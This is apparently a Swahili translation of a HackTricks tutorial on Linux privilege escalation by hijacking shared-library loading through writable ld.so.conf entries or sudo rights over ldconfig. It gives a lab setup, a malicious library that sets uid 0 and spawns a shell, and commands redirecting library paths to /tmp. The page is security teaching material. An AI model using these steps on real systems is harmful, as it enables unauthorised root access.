# mfano wa exploit ya privesc ya ld.so

{{#include ../../banners/hacktricks-training.md}}

## Andaa mazingira

Katika sehemu ifuatayo unaweza kupata msimbo wa faili tunavyotumia kuandaa mazingira

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Unda** hizo faili kwenye mashine yako katika folda ileile
2. **Kusanya** **maktaba**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Nakili** `libcustom.so` kwenda `/usr/lib`: `sudo cp libcustom.so /usr/lib` (privs za root)
4. **Kusanya** **kifaa**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Angalia mazingira

Angalia kwamba _libcustom.so_ inachukuliwa **kutoka** _/usr/lib_ na kwamba unaweza **kutekeleza** binary hiyo.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
## Exploit

Katika hali hii tunaenda kudhani kwamba **mtu ameunda kiingilio chenye udhaifu** ndani ya faili katika _/etc/ld.so.conf/_:
```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```
Kabrasha iliyo hatarini ni _/home/ubuntu/lib_ (ambapo tuna ufikiaji wa kuandika).\
**Pakua na uunde** msimbo ufuatao ndani ya njia hiyo:
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```
Sasa kwamba tumekuwa **tumetengeneza maktaba ya libcustom yenye madhara ndani ya** njia isiyo sahihi, tunahitaji kusubiri kwa **kuanzisha upya** au kwa mtumiaji wa root kutekeleza **`ldconfig`** (_ikiwa unaweza kutekeleza hii binary kama **sudo** au ina **suid bit** utaweza kuitekeleza mwenyewe_).

Mara hii itakapofanyika **angalia tena** wapi `sharevuln` executable inachota maktaba ya `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Kama unavyoona inachukuliwa kutoka `/home/ubuntu/lib` na ikiwa mtumiaji yeyote atatekeleza, shell itatekelezwa:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!NOTE]
> Kumbuka kwamba katika mfano huu hatujapandisha mamlaka, lakini kwa kubadilisha amri zinazotekelezwa na **kusubiri mtumiaji wa root au mwingine mwenye mamlaka kutekeleza binary iliyo hatarini** tutaweza kupandisha mamlaka.

### Mipangilio mingine isiyo sahihi - Uthibitisho sawa

Katika mfano wa awali tulifanya kama kuna mipangilio isiyo sahihi ambapo msimamizi **aliweka folda isiyo na mamlaka ndani ya faili ya usanidi ndani ya `/etc/ld.so.conf.d/`**.\
Lakini kuna mipangilio mingine isiyo sahihi ambayo inaweza kusababisha udhaifu sawa, ikiwa una **idhini za kuandika** katika baadhi ya **faili za usanidi** ndani ya `/etc/ld.so.conf.d`, katika folda `/etc/ld.so.conf.d` au katika faili `/etc/ld.so.conf` unaweza kuunda udhaifu sawa na kuutumia.

## Exploit 2

**Fikiria una mamlaka ya sudo juu ya `ldconfig`**.\
Unaweza kuonyesha `ldconfig` **wapi kupakia faili za usanidi**, hivyo tunaweza kutumia fursa hii kufanya `ldconfig` ipakie folda zisizo za kawaida.\
Hivyo, hebu tuunde faili na folda zinazohitajika kupakia "/tmp":
```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Sasa, kama ilivyoonyeshwa katika **kuvunjika kwa awali**, **unda maktaba mbaya ndani ya `/tmp`**.\
Na hatimaye, hebu tupakue njia na kuangalia ni wapi binary inayo pakua maktaba kutoka:
```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Kama unavyoona, kuwa na ruhusa za sudo juu ya `ldconfig` unaweza kutumia udhaifu huo huo.**

{{#include ../../banners/hacktricks-training.md}}
